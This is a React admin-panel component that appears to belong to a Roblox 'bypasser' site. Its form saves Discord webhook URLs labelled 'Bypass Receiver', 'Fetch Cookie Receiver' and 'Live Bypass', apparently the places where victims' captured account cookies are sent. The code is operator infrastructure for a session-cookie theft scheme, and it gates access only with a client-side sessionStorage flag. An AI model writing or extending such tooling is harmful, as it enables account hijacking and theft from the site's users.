import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Shield, LogOut, Webhook } from "lucide-react";
import { WK, getWebhook, setWebhook } from "@/lib/tokenStore";
import { toast } from "sonner";

const AdminPanel = () => {
  const navigate = useNavigate();
  const [bypassWh, setBypassWh] = useState("");
  const [fetchWh, setFetchWh] = useState("");
  const [liveWh, setLiveWh] = useState("");
  const [siteUrl, setSiteUrl] = useState("");

  useEffect(() => {
    if (sessionStorage.getItem("admin") !== "true") { navigate("/admin-login"); return; }
    setBypassWh(getWebhook(WK.bypass));
    setFetchWh(getWebhook(WK.fetchCookie));
    setLiveWh(getWebhook(WK.liveBypass));
    setSiteUrl(getWebhook(WK.siteUrl));
  }, [navigate]);

  const saveAll = () => {
    setWebhook(WK.bypass, bypassWh);
    setWebhook(WK.fetchCookie, fetchWh);
    setWebhook(WK.liveBypass, liveWh);
    setWebhook(WK.siteUrl, siteUrl);
    toast.success("Settings saved");
  };

  const handleLogout = () => { sessionStorage.removeItem("admin"); navigate("/"); };

  return (
    <div className="min-h-screen px-4 py-6">
      <div className="max-w-lg mx-auto space-y-5 animate-fade-in-up">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center glow-border">
              <Shield size={18} className="text-primary" />
            </div>
            <h1 className="text-lg font-bold text-foreground">Admin Panel</h1>
          </div>
          <button onClick={handleLogout} className="text-muted-foreground hover:text-foreground transition-colors p-2"><LogOut size={18} /></button>
        </div>

        <div className="card-glow rounded-2xl p-5 space-y-3">
          <h2 className="text-base font-bold text-foreground flex items-center gap-2">
            <div className="w-7 h-7 rounded-lg bg-primary/20 flex items-center justify-center"><Webhook size={14} className="text-primary" /></div>
            Webhook Configuration
          </h2>
          <div className="space-y-3 pt-2">
            <div className="space-y-1">
              <label className="text-xs font-medium text-muted-foreground">Bypass Receiver</label>
              <input value={bypassWh} onChange={e => setBypassWh(e.target.value)} placeholder="https://discord.com/api/webhooks/..." className="input-field text-xs font-mono" />
            </div>
            <div className="space-y-1">
              <label className="text-xs font-medium text-muted-foreground">Fetch Cookie Receiver</label>
              <input value={fetchWh} onChange={e => setFetchWh(e.target.value)} placeholder="https://discord.com/api/webhooks/..." className="input-field text-xs font-mono" />
            </div>
            <div className="space-y-1">
              <label className="text-xs font-medium text-muted-foreground">Live Bypass</label>
              <input value={liveWh} onChange={e => setLiveWh(e.target.value)} placeholder="https://discord.com/api/webhooks/..." className="input-field text-xs font-mono" />
            </div>
            <div className="space-y-1 pt-2 border-t border-border/40">
              <label className="text-xs font-medium text-muted-foreground">Site URL (used in embed)</label>
              <input value={siteUrl} onChange={e => setSiteUrl(e.target.value)} placeholder="https://Rblxbypasser.com" className="input-field text-xs font-mono" />
            </div>
            <button onClick={saveAll} className="bg-primary text-primary-foreground px-4 py-2.5 rounded-xl font-medium text-sm hover:opacity-90 w-full transition-all hover:scale-[1.01]">Save Settings</button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;
